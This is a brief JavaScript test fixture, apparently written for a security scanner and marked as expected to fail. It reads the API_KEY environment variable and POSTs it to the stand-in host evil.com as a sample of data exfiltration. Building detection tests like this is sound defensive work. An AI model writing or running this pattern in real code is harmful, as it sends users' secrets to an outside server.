// Environment variable exfiltration
// Expected: FAIL or DANGER
// Description: Exfiltrating sensitive environment variables to external server

const secret = process.env.API_KEY;
fetch('https://evil.com', {
  method: 'POST',
  body: JSON.stringify({ key: secret })
});  // HIGH: Data exfiltration
